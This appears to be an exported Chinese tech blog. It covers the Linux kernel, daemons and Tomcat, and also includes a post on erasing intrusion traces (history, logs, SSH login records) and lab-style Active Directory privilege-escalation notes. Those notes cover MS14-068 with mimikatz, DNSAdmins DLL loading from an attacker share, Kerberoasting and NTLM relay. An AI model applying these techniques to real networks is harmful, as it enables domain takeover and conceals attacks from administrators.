层提供了某些机制执行从用户空间到内核的函数调用。正如前面讨论的一样，这个接口依赖于体系结构，甚至在相同的处理器家族内也是如此。SCI 实际上是一个非常有用的函数调用多路复用和多路分解服务。在 .&#x2F;linux&#x2F;kernel 中您可以找到 SCI 的实现，并在 .&#x2F;linux&#x2F;arch 中找到依赖于体系结构的部分。 （2）进程管理进程管理的重点是进程的执行。在内核中，这些进程称为线程，代表了单独的处理器虚拟化（线程代码、数据、堆栈和 CPU 寄存器）。在用户空间，通常使用进程 这个术语，不过 Linux 实现并没有区分这两个概念（进程和线程）。内核通过 SCI 提供了一个应用程序编程接口（API）来创建一个新进程（fork、exec 或 Portable Operating System Interface [POSIX] 函数），停止进程（kill、exit），并在它们之间进行通信和同步（signal 或者 POSIX 机制）。 进程管理还包括处理活动进程之间共享 CPU 的需求。内核实现了一种新型的调度算法，不管有多少个线程在竞争 CPU，这种算法都可以在固定时间内进行操作。这种算法就称为 O(1) 调度程序，这个名字就表示它调度多个线程所使用的时间和调度一个线程所使用的时间是相同的。O(1) 调度程序也可以支持多处理器（称为对称多处理器或 SMP）。您可以在 .&#x2F;linux&#x2F;kernel 中找到进程管理的源代码，在 .&#x2F;linux&#x2F;arch 中可以找到依赖于体系结构的源代码。 （3）内存管理内核所管理的另外一个重要资源是内存。为了提高效率，如果由硬件管理虚拟内存，内存是按照所谓的内存页 方式进行管理的（对于大部分体系结构来说都是 4KB）。Linux 包括了管理可用内存的方式，以及物理和虚拟映射所使用的硬件机制。不过内存管理要管理的可不止 4KB 缓冲区。Linux 提供了对 4KB 缓冲区的抽象，例如 slab 分配器。这种内存管理模式使用 4KB 缓冲区为基数，然后从中分配结构，并跟踪内存页使用情况，比如哪些内存页是满的，哪些页面没有完全使用，哪些页面为空。这样就允许该模式根据系统需要来动态调整内存使用。为了支持多个用户使用内存，有时会出现可用内存被消耗光的情况。由于这个原因，页面可以移出内存并放入磁盘中。这个过程称为交换，因为页面会被从内存交换到硬盘上。内存管理的源代码可以在 .&#x2F;linux&#x2F;mm 中找到。 （4）虚拟文件系统虚拟文件系统（VFS）是 Linux 内核中非常有用的一个方面，因为它为文件系统提供了一个通用的接口抽象。VFS 在 SCI 和内核所支持的文件系统之间提供了一个交换层（请参看图4）。 图3 Linux文件系统层次结构 在 VFS 上面，是对诸如 open、close、read 和 write 之类的函数的一个通用 API 抽象。在 VFS 下面是文件系统抽象，它定义了上层函数的实现方式。它们是给定文件系统（超过 50 个）的插件。文件系统的源代码可以在 .&#x2F;linux&#x2F;fs 中找到。文件系统层之下是缓冲区缓存，它为文件系统层提供了一个通用函数集（与具体文件系统无关）。这个缓存层通过将数据保留一段时间（或者随即预先读取数据以便在需要是就可用）优化了对物理设备的访问。缓冲区缓存之下是设备驱动程序，它实现了特定物理设备的接口。 （5）网络堆栈网络堆栈在设计上遵循模拟协议本身的分层体系结构。回想一下，Internet Protocol (IP) 是传输协议（通常称为传输控制协议或 TCP）下面的核心网络层协议。TCP 上面是 socket 层，它是通过 SCI 进行调用的。socket 层是网络子系统的标准 API，它为各种网络协议提供了一个用户接口。从原始帧访问到 IP 协议数据单元（PDU），再到 TCP 和 User Datagram Protocol (UDP)，socket 层提供了一种标准化的方法来管理连接，并在各个终点之间移动数据。内核中网络源代码可以在 .&#x2F;linux&#x2F;net 中找到。 （6）设备驱动程序Linux 内核中有大量代码都在设备驱动程序中，它们能够运转特定的硬件设备。Linux 源码树提供了一个驱动程序子目录，这个目录又进一步划分为各种支持设备，例如 Bluetooth、I2C、serial 等。设备驱动程序的代码可以在 .&#x2F;linux&#x2F;drivers 中找到。 （7）依赖体系结构的代码尽管 Linux 很大程度上独立于所运行的体系结构，但是有些元素则必须考虑体系结构才能正常操作并实现更高效率。.&#x2F;linux&#x2F;arch 子目录定义了内核源代码中依赖于体系结构的部分，其中包含了各种特定于体系结构的子目录（共同组成了 BSP）。对于一个典型的桌面系统来说，使用的是 x86 目录。每个体系结构子目录都包含了很多其他子目录，每个子目录都关注内核中的一个特定方面，例如引导、内核、内存管理等。这些依赖体系结构的代码可以在 .&#x2F;linux&#x2F;arch 中找到。 如果 Linux 内核的可移植性和效率还不够好，Linux 还提供了其他一些特性，它们无法划分到上面的分类中。作为一个生产操作系统和开源软件，Linux 是测试新协议及其增强的良好平台。Linux 支持大量网络协议，包括典型的 TCP&#x2F;IP，以及高速网络的扩展（大于 1 Gigabit Ethernet [GbE] 和 10 GbE）。Linux 也可以支持诸如流控制传输协议（SCTP）之类的协议，它提供了很多比 TCP 更高级的特性（是传输层协议的接替者）。 Linux 还是一个动态内核，支持动态添加或删除软件组件。被称为动态可加载内核模块，它们可以在引导时根据需要（当前特定设备需要这个模块）或在任何时候由用户插入。 Linux 最新的一个增强是可以用作其他操作系统的操作系统（称为系统管理程序）。最近，对内核进行了修改，称为基于内核的虚拟机（KVM）。这个修改为用户空间启用了一个新的接口，它可以允许其他操作系统在启用了 KVM 的内核之上运行。除了运行 Linux 的其他实例之外， Microsoft Windows也可以进行虚拟化。惟一的限制是底层处理器必须支持新的虚拟化指令。 Linux体系结构和内核结构区别1．当被问到Linux体系结构（就是Linux系统是怎么构成的）时，我们可以参照下图这么回答：从大的方面讲，Linux体系结构可以分为两块： （1）用户空间：用户空间中又包含了，用户的应用程序，C库 （2）内核空间：内核空间包括，系统调用，内核，以及与平台架构相关的代码 2．Linux体系结构要分成用户空间和内核空间的原因： 1）现代CPU通常都实现了不同的工作模式， 以ARM为例：ARM实现了7种工作模式，不同模式下CPU可以执行的指令或者访问的寄存器不同： （1）用户模式 usr （2）系统模式 sys （3）管理模式 svc （4）快速中断 fiq （5）外部中断 irq （6）数据访问终止 abt （7）未定义指令异常 以（2）X86为例：X86实现了4个不同级别的权限，Ring0—Ring3 ;Ring0下可以执行特权指令，可以访问IO设备；Ring3则有很多的限制 2）所以，Linux从CPU的角度出发，为了保护内核的安全，把系统分成了2部分； 3．用户空间和内核空间是程序执行的两种不同状态，我们可以通过“系统调用”和“硬件中断“来完成用户空间到内核空间的转移 4．Linux的内核结构（注意区分LInux体系结构和Linux内核结构） Linux驱动的platform机制Linux的这种platform driver机制和传统的device_driver机制相比，一个十分明显的优势在于platform机制将本身的资源注册进内核，由内核统一管理，在驱动程序中使用这些资源时通过platform_device提供的标准接口进行申请并使用。这样提高了驱动和资源管理的独立性，并且拥有较好的可移植性和安全性。下面是SPI驱动层次示意图，Linux中的SPI总线可理解为SPI控制器引出的总线： 和传统的驱动一样，platform机制也分为三个步骤： 1、总线注册阶段：内核启动初始化时的main.c文件中的kernel_init()→do_basic_setup()→driver_init()→platform_bus_init()→bus_register(&amp;platform_bus_type)，注册了一条platform总线（虚拟总线，platform_bus）。 2、添加设备阶段：设备注册的时候Platform_device_register()→platform_device_add()→(pdev→dev.bus &#x3D; &amp;platform_bus_type)→device_add()，就这样把设备给挂到虚拟的总线上。 3、驱动注册阶段：Platform_driver_register()→driver_register()→bus_add_driver()→driver_attach()→bus_for_each_dev(), 对在每个挂在虚拟的platform bus的设备作__driver_attach()→driver_probe_device(),判断drv→bus→match()是否执行成功，此时通过指针执行platform_match→strncmp(pdev→name , drv→name , BUS_ID_SIZE),如果相符就调用really_probe(实际就是执行相应设备的platform_driver→probe(platform_device)。)开始真正的探测，如果probe成功，则绑定设备到该驱动。 从上面可以看出，platform机制最后还是调用了bus_register() , device_add() , driver_register()这三个关键的函数。 下面看几个结构体： Platform_device结构体描述了一个platform结构的设备，在其中包含了一般设备的结构体struct device dev;设备的资源结构体struct resource * resource;还有设备的名字const char * name。（注意，这个名字一定要和后面platform_driver.driver àname相同，原因会在后面说明。） 该结构体中最重要的就是resource结构，这也是之所以引入platform机制的原因。 其中 flags位表示该资源的类型，start和end分别表示该资源的起始地址和结束地址(&#x2F;include&#x2F;linux&#x2F;Platform_device.h)： Platform_driver结构体描述了一个platform结构的驱动。其中除了一些函数指针外，还有一个一般驱动的device_driver结构。 名字要一致的原因： 上面说的驱动在注册的时候会调用函数bus_for_each_dev(), 对在每个挂在虚拟的platform bus的设备作__driver_attach()→driver_probe_device(),在此函数中会对dev和drv做初步的匹配，调用的是drv-&gt;bus-&gt;match所指向的函数。platform_driver_register函数中drv-&gt;driver.bus &#x3D; &amp;platform_bus_type，所以drv-&gt;bus-&gt;match就为platform_bus_type→match,为platform_match函数，该函数如下： 是比较dev和drv的name，相同则会进入really_probe（）函数，从而进入自己写的probe函数做进一步的匹配。所以dev→name和driver→drv→name在初始化时一定要填一样的。 不同类型的驱动，其match函数是不一样的，这个platform的驱动，比较的是dev和drv的名字，还记得usb类驱动里的match吗？它比较的是Product ID和Vendor ID。 个人总结Platform机制的好处： 1、提供platform_bus_type类型的总线，把那些不是总线型的soc设备都添加到这条虚拟总线上。使得，总线——设备——驱动的模式可以得到普及。 2、提供platform_device和platform_driver类型的数据结构，将传统的device和driver数据结构嵌入其中，并且加入resource成员，以便于和Open Firmware这种动态传递设备资源的新型bootloader和kernel 接轨。 Linux内核体系结构因为Linux内核是单片的，所以它比其他类型的内核占用空间最大，复杂度也最高。这是一个设计特性，在Linux早期引起了相当多的争论，并且仍然带有一些与单内核固有的相同的设计缺陷。 为了解决这些缺陷，Linux内核开发人员所做的一件事就是使内核模块可以在运行时加载和卸载，这意味着您可以动态地添加或删除内核的特性。这不仅可以向内核添加硬件功能，还可以包括运行服务器进程的模块，比如低级别虚拟化，但也可以替换整个内核，而不需要在某些情况下重启计算机。 想象一下，如果您可以升级到Windows服务包，而不需要重新启动…… 内核模块如果Windows已经安装了所有可用的驱动程序，而您只需要打开所需的驱动程序怎么办?这本质上就是内核模块为Linux所做的。内核模块，也称为可加载内核模块(LKM)，对于保持内核在不消耗所有可用内存的情况下与所有硬件一起工作是必不可少的。 模块通常向基本内核添加设备、文件系统和系统调用等功能。lkm的文件扩展名是.ko，通常存储在&#x2F;lib&#x2F;modules目录中。由于模块的特性，您可以通过在启动时使用menuconfig命令将模块设置为load或not load，或者通过编辑&#x2F;boot&#x2F;config文件，或者使用modprobe命令动态地加载和卸载模块，轻松定制内核。 第三方和封闭源码模块在一些发行版中是可用的，比如Ubuntu，默认情况下可能无法安装，因为这些模块的源代码是不可用的。该软件的开发人员(即nVidia、ATI等)不提供源代码，而是构建自己的模块并编译所需的.ko文件以便分发。虽然这些模块像beer一样是免费的，但它们不像speech那样是免费的，因此不包括在一些发行版中，因为维护人员认为它通过提供非免费软件“污染”了内核。 内核并不神奇，但对于任何正常运行的计算机来说，它都是必不可少的。Linux内核不同于OS X和Windows，因为它包含内核级别的驱动程序，并使许多东西“开箱即用”。希望您能对软件和硬件如何协同工作以及启动计算机所需的文件有更多的了解。 "},{"title":"痕迹清理","date":"2023-10-10T10:47:15.000Z","url":"/2023/10/10/%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86/","categories":[["undefined",""]],"content":"Linux 入侵痕迹清理技巧在攻击结束后，如何不留痕迹的清除日志和操作记录，以掩盖入侵踪迹，这其实是一个细致的技术活。你所做的每一个操作，都要被抹掉；你所上传的工具，都应该被安全地删掉。 01、清除history历史命令记录 查看历史操作命令： 第一种方式： （1）编辑history记录文件，删除部分不想被保存的历史命令。 （2）清除当前用户的history命令记录 第二种方式： （1）利用vim特性删除历史命令 （2）在vim中执行自己不想让别人看到的命令 第三种方式： 通过修改配置文件&#x2F;etc&#x2F;profile，使系统不再保存命令记录。 第四种方式： 登录后执行下面命令,不记录历史命令(.bash_history) 02、清除系统日志痕迹 Linux 系统存在多种日志文件，来记录系统运行过程中产生的日志。 第一种方式：清空日志文件清除登录系统失败的记录： 清除登录系统成功的记录： 清除相关日志信息： 第二种方式：删除&#x2F;替换部分日志 日志文件全部被清空，太容易被管理员察觉了，如果只是删除或替换部分关键日志信息，那么就可以完美隐藏攻击痕迹。 03、清除web入侵痕迹 第一种方式： 直接替换日志ip地址 第二种方式：清除部分相关日志 04、文件安全删除工具 （1）shred命令实现安全的从硬盘上擦除数据，默认覆盖3次，通过 -n指定数据覆盖次数。 （2）dd命令可用于安全地清除硬盘或者分区的内容。 （3）wipeWipe 使用特殊的模式来重复地写文件，从磁性介质中安全擦除文件。 （4）Secure-DeleteSecure-Delete 是一组工具集合，提供srm、smem、sfill、sswap，4个安全删除文件的命令行工具。 05、隐藏远程SSH登陆记录 隐身登录系统，不会被w、who、last等指令检测到。 不记录ssh公钥在本地.ssh目录中 "},{"title":"守护进程","date":"2023-10-10T07:27:29.000Z","url":"/2023/10/10/%E5%AE%88%E6%8A%A4%E8%BF%9B%E7%A8%8B/","categories":[["undefined",""]],"content":"Linux 守护进程的启动方法一、问题的由来Web应用写好后，下一件事就是启动，让它一直在后台运行。 这并不容易。举例来说，下面是一个最简单的Node应用server.js，只有6行。 你在命令行下启动它。 看上去一切正常，所有人都能快乐地访问 5000 端口了。但是，一旦你退出命令行窗口，这个应用就一起退出了，无法访问了。 怎么才能让它变成系统的守护进程（daemon），成为一种服务（service），一直在那里运行呢？ 二、前台任务与后台任务上面这样启动的脚本，称为”前台任务”（foreground job）。它会独占命令行窗口，只有运行完了或者手动中止，才能执行其他命令。 变成守护进程的第一步，就是把它改成”后台任务”（background job）。 只要在命令的尾部加上符号&amp;，启动的进程就会成为”后台任务”。如果要让正在运行的”前台任务”变为”后台任务”，可以先按ctrl + z，然后执行bg命令（让最近一个暂停的”后台任务”继续执行）。 “后台任务”有两个特点。 继承当前 session （对话）的标准输出（stdout）和标准错误（stderr）。因此，后台任务的所有输出依然会同步地在命令行下显示。 不再继承当前 session 的标准输入（stdin）。你无法向这个任务输入指令了。如果它试图读取标准输入，就会暂停执行（halt）。 可以看到，”后台任务”与”前台任务”的本质区别只有一个：是否继承标准输入。所以，执行后台任务的同时，用户还可以输入其他命令。 三、SIGHUP信号变为”后台任务”后，一个进程是否就成为了守护进程呢？或者说，用户退出 session 以后，”后台任务”是否还会继续执行？ Linux系统是这样设计的。 用户准备退出 session 系统向该 session 发出SIGHUP信号 session 将SIGHUP信号发给所有子进程 子进程收到SIGHUP信号后，自动退出 上面的流程解释了，为什么”前台任务”会随着 session 的退出而退出：因为它收到了SIGHUP信号。 那么，”后台任务”是否也会收到SIGHUP信号？ 这由 Shell 的huponexit参数决定的。 执行上面的命令，就会看到huponexit参数的值。 大多数Linux系统，这个参数默认关闭（off）。因此，session 退出的时候，不会把SIGHUP信号发给”后台任务”。所以，一般来说，”后台任务”不会随着 session 一起退出。 四、disown 命令通过”后台任务”启动”守护进程”并不保险，因为有的系统的huponexit参数可能是打开的（on）。 更保险的方法是使用disown命令。它可以将指定任务从”后台任务”列表（jobs命令的返回结果）之中移除。一个”后台任务”只要不在这个列表之中，session 就肯定不会向它发出SIGHUP信号。 执行上面的命令以后，server.js进程就被移出了”后台任务”列表。你可以执行jobs命令验证，输出结果里面，不会有这个进程。 disown的用法如下。 五、标准 I&#x2F;O使用disown命令之后，还有一个问题。那就是，退出 session 以后，如果后台进程与标准I&#x2F;O有交互，它还是会挂掉。 还是以上面的脚本为例，现在加入一行。 启动上面的脚本，然后再执行disown命令。 接着，你退出 session，访问5000端口，就会发现连不上。 这是因为”后台任务”的标准 I&#x2F;O 继承自当前 session，disown命令并没有改变这一点。一旦”后台任务”读写标准 I&#x2F;O，就会发现它已经不存在了，所以就报错终止执行。 为了解决这个问题，需要对”后台任务”的标准 I&#x2F;O 进行重定向。 上面这样执行，基本上就没有问题了。 六、nohup 命令还有比disown更方便的命令，就是nohup。 nohup命令对server.js进程做了三件事。 阻止SIGHUP信号发到这个进程。 关闭标准输入。该进程不再能够接收任何输入，即使运行在前台。 重定向标准输出和标准错误到文件nohup.out。 也就是说，nohup命令实际上将子进程与它所在的 session 分离了。 注意，nohup命令不会自动把进程变为”后台任务”，所以必须加上&amp;符号。 七、Screen 命令与 Tmux 命令另一种思路是使用 terminal multiplexer （终端复用器：在同一个终端里面，管理多个session），典型的就是 Screen 命令和 Tmux 命令。 它们可以在当前 session 里面，新建另一个 session。这样的话，当前 session 一旦结束，不影响其他 session。而且，以后重新登录，还可以再连上早先新建的 session。 Screen 的用法如下。 然后，按下ctrl + A和ctrl + D，回到原来的 session，从那里退出登录。下次登录时，再切回去。 如果新建多个后台 session，就需要为它们指定名字。 如果要停掉某个 session，可以先切回它，然后按下ctrl + c和ctrl + d。 Tmux 比 Screen 功能更多、更强大，它的基本用法如下。 除了tmux detach，另一种方法是按下Ctrl + B和d ，也可以回到原来的 session。 如果新建多个 session，就需要为每个 session 指定名字。 八、Node 工具对于 Node 应用来说，可以不用上面的方法，有一些专门用来启动的工具：forever，nodemon 和 pm2。 forever 的功能很简单，就是保证进程退出时，应用会自动重启。 nodemon一般只在开发时使用，它最大的长处在于 watch 功能，一旦文件发生变化，就自动重启进程。 pm2 的功能最强大，除了重启进程以外，还能实时收集日志和监控。 十、Systemd除了专用工具以外，Linux系统有自己的守护进程管理工具 Systemd 。它是操作系统的一部分，直接与内核交互，性能出色，功能极其强大。我们完全可以将程序交给 Systemd ，让系统统一管理，成为真正意义上的系统服务。 登录服务器，vim /etc/systemd/system/test.service 复制以下文件： 复制 保存好，然后执行systectl daemon-reload重新加载配置文件 再执行，systemctl enable test.service设置为开机启动 systemctl start test (手动启动) 如果启动失败，可以通过journalctl -n 50，查看最近50条的日志 守护进程（Daemon Process）和后台进程（Background Process）是两个不同的概念，虽然它们都在后台运行，但有一些关键的区别： 目的和用途： 监视进程：监视进程通常是为了提供系统服务、执行特定任务或监视进程而创建的。它们通常在系统启动时启动，独立于用户会话，并在整个系统运行期间一直存在其他。典型的监视进程包括网络服务（如HTTP服务器）、系统日志监控进程（如syslogd）等。 后台进程：后台进程是启动用户的进程，在用户终端会话之外运行。它们可能是由用户手动启动的，目的是在后台执行某个任务，但通常与用户会话相关，受用户的控制。例如，使用&amp;符号将一个进程置于后台执行。 生命周期： 监视进程：监视进程通常在系统启动时启动，并持续运行，直到系统关闭或被显式停止。它们独立于用户登录和注销，通常会占用用户干预。 后台进程：后台进程的生命周期通常与用户终止会话相关。它们在用户注销时通常会受到影响，会被终止或挂起。后台进程通常受用户控制，可以通过特定命令来启动、停止或暂停。 与终端的关联： 监视进程：监视进程通常与终端无关，不受终端会话的影响，通常会通过setsid()等方法分隔终端控制。 后台进程：后台进程通常仍然与用户终端会话相关，尽管它们在后台运行，但仍然可以通过终端控制。 总之，守护进程和后台进程都处于后台运行的进程，但它们的用途、生命周期和与终端的关联有所不同。守护进程通常是为系统服务或特定任务而设计的，而后台进程通常是为系统服务或特定任务而设计的。用户手动启动的，并受用户终端会话的影响。"},{"title":"域控提权","date":"2023-10-10T07:07:19.000Z","url":"/2023/10/10/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83/","categories":[["undefined",""]],"content":"0x01、前言菜鸡一枚，标题起的可能有点大，只是个人笔记整理的一个合集（所以基本每个例子都会有实例）。所以虽然说是合集，可能都没有囊括到各位大佬会的一半。还请各位大佬轻喷 0x02、目录 GPP和SYSVOL中的密码 MS14-068 DNSAdmins 不安全的GPO权限 不安全的ACLs权限 Exchange LLMNR&#x2F;NBT-NS 投毒 Kerberoasting AD recyle Bin 0x03、 GPP和SYSVOL中的密码什么是GPP:GPP被用来将通用的本地管理员密码应用于所有工作站、应用全新的管理员帐户、为其他用户安排任务、应用打印机等用途一般域内机子较多的情况，管理员为了方便管理，在主机上设置本地管理员密码GPP。配置此功能后，会在域控制器上创建一个XML文件，其中包含将策略应用于连接到域的工作站或便携式计算机时配置帐户所需的信息。该xml文件包含管理帐户的密码，一般情况下任意域用户都可以读取（通常是DC开启SYSVOL目录共享）这里不得不提的一点是Microsoft已使用AES加密了xml文件中的密码以提高安全性，但又发布了用于加密和解密该值的密钥（所以这是什么操作？？？） 漏洞利用：接到域控制器的默认SYSVOL共享，并在其中搜索groups.xml的实例。如果存在这些文件，位于格式类似于以下的文件夹中： 0x03.1、定位域控制器 0x03.2、查询DC共享目录使用enumlinux或者smbmap检查共享目录 smbmap -H 10.10.10.100 ###列出目标用户共享列表 0x03.3、连接域共享 smb: \\active.local\\Policies{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\Groups&gt; more Groups.xml 0x03.4、使用gpprefdecrypt.py解密： 0x04、MS14-068危害：任意域内用户都可以提权到域控 一般为本地账户才能成功，但是使用klist purge清除缓存证书可绕过限制 0x04.1、漏洞成因在 KDC 对 PAC 进行验证时，根据协议规定必须是带有 server Hash、KDC Hash 的签名算法才可以（原本的设计是 HMAC 系列的 checksum 算法），但微软在实现上，却允许任意签名算法。只要客户端指定任意签名算法，KDC 就会使用指定的算法进行签名验证，致使导致恶意用户在发送给KDC的TG_REQ中可以创建包含管理员帐户成员身份的伪造PAC被KDC接收，并将其放入TG_REP中发布的新TGT票证中。该票证可用于向KDC要求服务票证的服务升级特权：在这种情况下，是smb服务票证。 什么是PAC（特权帐户证书）：PAC包含域控制器（DC）提供的授权数据，Active Directory将授权数据存储在PAC（特权帐户证书）的票证字段中。PAC由DC在服务单的现场授权数据中提供。它用KDC密钥（只有AD知道）签名，并用要验证的服务和AD之间共享的服务密钥签名。 0x04.2、利用条件1.域控机器没有打漏洞补丁 补丁号：KB30117802.拥有一台域内机子及其sid 0x04.3、漏洞利用漏洞检测 ##：FindSMB2UpTime.py(但是这个并不一定准确，因为域控是一般不会重启，但是也有存在意外重启的情况，那么即使有ms14-068也不会显示) 获取域控制器补丁状态:Get-DCPatchStatus.ps1 0x04.4、环境描述：目标机器：10.10.10.52 Windows Server 2008 R2 Standard已获取：DC上的一个普通本地账户james用户账户密码james sid （可通过多种途径获取 rpclient：lookupnames james 目标机器shell中：whoami &#x2F;all ，）攻击机：kali 10.10.14.14 （不在域中） 在Linux上利用：(有用户凭据、没有目标shell的情况下)1.安装客户端，在客户端生成票证 2.编辑&#x2F;etc&#x2F;krb5.conf[libdefaults]default_realm &#x3D; HTB.LOCAL 3.添加路由：编辑&#x2F;etc&#x2F;resolve.conf nameserver 10.10.10.52 4.同步域控时间（确定DC的时间（用于票证同步），按照RFC必须在5分钟内完成，但+ -30分钟的偏差也可以的） [方法1]net time -S 10.10.10.52 -U“” ##获取DC时间，然后收到设置本机时间[方法2]sudo rdate -n 10.10.10.52 ###直接同步到域控时间 5.为james用户生成一张新的Kerberos票证 此时生成的是james的票证：访问C$是没有权限的 6.ms14-068生成高权限TGT票证 7.替换低权限票证mv &#84;&#71;&#x54;&#95;&#106;&#97;&#x6d;&#101;&#x73;&#64;&#x48;&#84;&#x42;&#46;&#x4c;&#x4f;&#67;&#65;&#x4c;&#46;&#x63;&#x63;&#x61;&#x63;&#x68;&#x65; &#x2F;tmp&#x2F;krb5cc_1000 8.smb成功登录C$ Mimikatz利用：先在目标机器使用ms14-068.exe生成票据，然后使用mimikatz注入票据，再使用psexec获取权限或winexec执行命令 ms14-068.py -u &#106;&#97;&#x6d;&#x65;&#115;&#64;&#x48;&#84;&#66;&#x2e;&#76;&#79;&#67;&#65;&#76; -s S-1-5-21-4220043660-4019079961-2895681657-1103 -d mantis 将&#x54;&#71;&#x54;&#x5f;&#106;&#97;&#x6d;&#x65;&#115;&#x40;&#x48;&#x54;&#x42;&#x2e;&#x4c;&#79;&#x43;&#x41;&#76;&#46;&#99;&#99;&#x61;&#99;&#104;&#x65;文件放入mimikatz目录中mimikatz.exe log “kerberos::ptc &#84;&#71;&#84;&#95;&#x6a;&#97;&#109;&#101;&#x73;&#x40;&#72;&#84;&#66;&#46;&#76;&#x4f;&#x43;&#x41;&#76;&#x2e;&#99;&#99;&#97;&#99;&#x68;&#101;“exit注入成功即可获得域管理session,可以klist看一下是否有了kerberos Ticketnet use \\htb.local\\admin$ ####使用IP可能会失败dir \\htb.local\\c$psexec \\htb.local cmd.exe 突破“本地账户才能漏洞利用”的限制：先 klist purgr清除缓存证书，再使用mimikatz生成高权限TGT的缓存证书进行连接： Impacket套件利用也有更简便的方法，不需要上边的种种配置，直接使用impacket套件下的GoldenPac一发入魂（ms14-068+psexec） 0x05、DNSAdmins默认情况下，域控也是DNS服务器，微软的DNS服务器作为域控上的服务来运行。通过DNSadmins到System，拿下域控权限利用条件：拥有DNSAdmins组成员的用户帐户权限，或者当前用户帐户具有对DNS服务器对象的写特权 whoami &#x2F;groups 查看用户组 制作dll： 开启smb共享：（可通过net use \\10.10.14.67\\tw 检测是否能连通smbserver ， 关于smbserver不能连接，排除网络问题之后，可能是共享占用问题，更改共享名称重新开启smbserver即可） 注入dll：dnscmd.exe 10.10.10.169 &#x2F;config &#x2F;serverlevelplugindll \\10.10.14.67\\tw\\plugin.dll 监听：nc -lvvp 444 重启dns致使paylload生效： 0x06、 不安全的GPO权限原理及GPO枚举：枚举有GPO修改权限（write Property）的用户 使用PowerView的New-GPOImmediateTask 函数进行利用： -TaskName是必需的参数，-Command 指定的命令来运行（默认为powershell.exe），-CommandArguments 指定给定的二进制的参数。schtask .xml会复制到-GPOname或-GPODisplayname参数确定的适当位置。默认情况下，该功能将在复制前提示您，但是可以使用-Force禁止显示。payload这里可以直接用empire生成的base64的paylaod执行完成之后删除schtask .xml： Github中的另外利用方式： 0x07、 不安全的ACLs权限原理及ACLs枚举：对域对象有WriteDacl权限&#x3D;&#x3D;&#x3D;&gt;DCSync Exchange提权就是最好的ACL滥用的例子，可结合下面的EXchange进一步理解 0x08、Exchange原理 ： Exchange Windows Permissions组成员在域内具有WriteDacl权限，将该组任意集成组WriteDacl权限的成员身份中继到LDAP后，可以修改域对象的ACL授予用户更高级别的访问权限，执行DCSync 也就是利用Exchange默认高权限账户进行LDAP中继授予用户DCSync权限 漏洞利用： net group 查看用户组 或者当前用户不在Exchange Permissions组中，但在Account Operator中（该组的成员能操作用户管理员所属域的账号和组，并可设置其权限。但是该组成员无法修改Administrators及Operators组及权限），可以添加一个用户并加入到Exchange Permissions添加用户tw： 将用户添加到Exchange Permissions组 检查是否已成功添加 使用ntlmrelayx进行ntlm中继： 运行该 中继 命令之后，可通过浏览器访问本地IP进行连接（输入tw账户密码），也可使用prieexchange.py进行连接 （10.10.16.21为我kali ip） 连接成功之后，使用secretdump.py导出域控hash #######时间蛮久的，需要出现上图提示 0x09、LLMNR&#x2F;NBT-NS投毒原理：如果DNS服务器解析失败，则要求解析的系统使用LLMNR（UDP 5355）或NBNS（UDP 137）在Windows系统上的网段上广播问题或查询。而后攻击者做出响应，请求系统将根据广播期间使用的服务（例如FTP）提供Net-NTLM哈希或明文凭据。 使用Responer执行监听，等待域控触发解析错误 也可使用MSF操作 0x10、Kerberoasting原理： 服务主体名称（SPN）用于唯一标识Windows服务的每个实例。为了支持Kerberos身份验证，SPN与至少一个服务登录帐户相关联Kerberoasting利用点在于Client使用有效的TGT向TGS请求Server的Kerberos令牌，TGS在KDC数据库中查找SPN，并使用与SPN关联的服务帐户对票证进行加密并发送给Client。然而这里TGS加密方式为RC4_HMAC_MD5，使用Server端的NTLM hash进行加密（使破解成为可能）此时攻击者借用一个有效的域用户身份请求一个或多个SPN的Kerberos令牌（加密后的TGS），然后进行离线破解得到SPN账户hash（这个过程甚至不用与目标SPN产生交互，即没有已被检测的流量产生，增强攻击的隐蔽性）假若使用的是HTTP（默认使用的是HTTPS），还可以通过捕获网络流量得到Kerberos令牌，然后进行离线破解攻击：扫描域中设置了SPN值的用户帐户。SPN账户格式：serviceclass&#x2F;host:port&#x2F;servicename —&gt; 使用SPN值从AD请求服务票证 返回服务票证并将其存储在系统的内存中，可以直接在当前窗口运行mimikatz导出内存中的票证 导出票证然后用tgsrecrack.py破解 上边的是从原理出发的实验步骤，现在有很多便捷的脚本，如impacket套件中的GetUserSPNs.pyempire中的Kerberoast.ps1效果如下： 破解：[1 hashcat]: hashcat -a 0 -m 13100 active.hash &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt –force[2 john] ： sudo john active.hash -w “&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt” 0x11、AD recyle Bin使用回收站还原用户，或获取用户旧密码进行碰撞 前提：需要域内启用回收站功能，且用户在AD Recyle Bin 组中未启用启用回收站和启用回收站删除对象对比 图1：启用回收站之前已删除的Active Directory对象的生命周期图 2：启用回收站后已删除的Active Directory对象的生命周期 启用AD回收站： 查看删除用户 结果示例： 尝试还原已删除账户 查询ms-mcs-admpwd 查看有关于特定账户的全部属性信息： 这里存在被删除的临时管理员TempAdmin的LegacyPassword"},{"title":"Tomcat启动过程","date":"2023-08-10T23:56:52.000Z","url":"/2023/08/11/Tomcat%E5%90%AF%E5%8A%A8%E8%BF%87%E7%A8%8B/","categories":[["undefined",""]],"content":"Tomcat - 启动过程：初始化和启动流程 在有了Tomcat架构设计和源码入口以后，我们便可以开始真正读源码了。 # 总体流程 很多人在看框架代码的时候会很难抓住重点的，而一开始了解整体流程会很大程度提升理解的效率。 我们看下整体的初始化和启动的流程，在理解的时候可以直接和Tomcat架构设计中组件关联上： # 代码浅析看了下网上关于Tomcat的文章，很多直接关注在纯代码的分析，这种是很难的；我建议你一定要把代码加载进来自己看一下，然后这里我把它转化为核心的几个问题来帮助你理解。 # Bootstrap主入口？Tomcat源码就从它的main方法开始。Tomcat的main方法在org.apache.catalina.startup.Bootstrap 里。 如下代码我们就是创建一个 Bootstrap 对象，调用它的 init 方法初始化，然后根据启动参数，分别调用 Bootstrap 对象的不同方法。 # Bootstrap如何初始化Catalina的？我们用Sequence Diagram插件来看main方法的时序图，但是可以发现它并没有帮我们画出Bootstrap初始化Catalina的过程，这和上面的组件初始化不符合？ 让我们带着这个为看下Catalina的初始化的 通过上面几行关键代码的注释，我们就可以看出Catalina是如何初始化的。这里还留下一个问题，tomcat为什么要初始化不同的classloader呢 Tomcat - 启动过程:类加载机制详解 